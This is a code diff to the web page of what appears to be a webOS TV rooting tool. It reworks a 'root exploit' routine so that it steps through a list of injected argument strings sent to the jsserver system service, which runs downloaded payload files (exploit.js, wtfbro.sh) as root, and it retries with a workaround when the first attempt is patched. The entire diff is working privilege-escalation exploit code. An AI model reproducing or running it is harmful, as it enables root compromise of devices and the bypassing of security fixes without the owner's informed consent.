@@ -83,6 +83,12 @@
   <script>
     var stateEl = document.getElementById('state');
     var detailEl = document.getElementById('detail');
+    var hackatt=0;
+    var targetDir = '/media/internal/downloads';
+    var hackperm = [
+{"inputParams": "-- /tmp/cgroup QwQ " + targetDir},
+{"inputParams": "QwQ -- /tmp/cgroup /usr/palm/services/com.webos.service.secondscreen.gateway/ " + targetDir},
+    ];
 
     function setState(name, detail) {
       stateEl.textContent = name;
@@ -106,52 +112,17 @@
         return payload;
       }
     }
-
-    function runRootExploit() {
-      setState('pending', 'Launching root exploit. Watch your TV for the result...');
-   var workymgs='Yippee root exploit is worky!!!Setting homebrew up...';
-      var payloadBase = new URL('./payload/', window.location.href).toString();
-      var files = [
-        'package.json' , 
-        'services.json', 
-        'exploit.js'   , 
-        'wtfbro.sh'    , 
-      ];
-      var written = 0;
-      var targetDir = '/media/internal/downloads';
-
-      function onAllWritten() {
-        setState('pending', 'triggering root execution...');
-        var bridge = new window.PalmServiceBridge();
-        bridge.onservicecallback = function(payload) {
+      function afterhackjserver(payload) {
           var parsed = parse(payload);
           if ( typeof(parsed.error) === 'string' && parsed.error.includes("trusted locations")  ) {
+		  if (hackperm.length===hackatt+1){
+
+            failStep('jsserver', 'jsserver is patched.Workarounds are patched');
+		  } else {
             failStep('jsserver', 'jsserver is patched.Trying workaround');
-        var patched = new window.PalmServiceBridge();
-		  patched.onservicecallback = function(payload) {
-          var parsed = parse(payload);
-	   if (typeof(parsed.error) === 'string'  && parsed.error.includes("trusted locations") ) {
-            failStep('jsserver', 'Workaround is no worky.');
-	   }else if ( parsed.returnValue === false) {
-		   //if the error msg is from webos not jsserver
-		   //then the error mgs would be in errorText
-		   //however error mgs from jsserver is in error
-		   if (typeof(parsed.error) === 'undefined'){
-            failStep('jsserver', parsed.errorText );
-		   }else if (typeof(parsed.errorText) === 'undefined'){
-            failStep('jsserver', parsed.error );
-			   
-		   } else {
-            failStep('jsserver', 'jsserver call failed');
-
-		   }
-	   }else {
-            setState('success', workymgs);
-	   }
+		  hackatt=hackatt+1;
+	hackjserver();
 		  }
- patched.call('luna://com.webos.service.jsserver/run',
-          JSON.stringify({"inputParams": "QwQ -- /tmp/cgroup /usr/palm/services/com.webos.service.secondscreen.gateway/ " + targetDir}));
-
 	  } else if ( parsed.returnValue === false) {
   if (typeof(parsed.error) === 'undefined'){
             failStep('jsserver', parsed.errorText );
@@ -163,12 +134,34 @@
 
 		   }
 	  } else {
-            setState('success', workymgs);
+            setState('success', 
+   'Yippee root exploit is worky!!!Setting homebrew up...');
 	  }
-	};
-        bridge.call('luna://com.webos.service.jsserver/run',
-          JSON.stringify({"inputParams": "-- /tmp/cgroup QwQ " + targetDir}));
 
+      }
+
+      function hackjserver() {
+        var bridge = new window.PalmServiceBridge();
+	console.log(hackatt);
+	console.log(hackperm[hackatt]);
+	bridge.onservicecallback=afterhackjserver;
+        bridge.call('luna://com.webos.service.jsserver/run',JSON.stringify(hackperm[hackatt]));
+      }
+
+    function runRootExploit() {
+      setState('pending', 'Launching root exploit. Watch your TV for the result...');
+      var payloadBase = new URL('./payload/', window.location.href).toString();
+      var files = [
+        'package.json' , 
+        'services.json', 
+        'exploit.js'   , 
+        'wtfbro.sh'    , 
+      ];
+      var written = 0;
+
+      function onAllWritten() {
+        setState('pending', 'triggering root execution...');
+       hackjserver(); 
         }
 
       function downloadFile(file) {
